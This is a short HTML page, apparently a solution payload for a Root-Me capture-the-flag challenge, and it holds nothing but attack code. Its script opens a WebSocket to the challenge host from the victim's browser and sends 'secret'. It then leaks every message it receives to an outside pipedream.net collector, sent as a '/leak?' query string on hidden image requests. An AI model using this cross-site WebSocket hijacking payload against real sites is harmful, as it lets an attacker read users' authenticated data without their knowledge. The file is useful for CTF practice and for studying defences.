<!DOCTYPE html>
<html>
<body>
  <script>
    const ws = new WebSocket('ws://ctf20.root-me.org/ws');
    new Image().src = 'http://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened';

    ws.onopen = () => {
      ws.send('secret');
      new Image().src = 'http://eo1gpdjxqwwogrz.m.pipedream.net/ws-onopen';
    };

    ws.onmessage = (e) => {
      new Image().src = 'http://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(e.data);
    };

  </script>
</body>
</html>
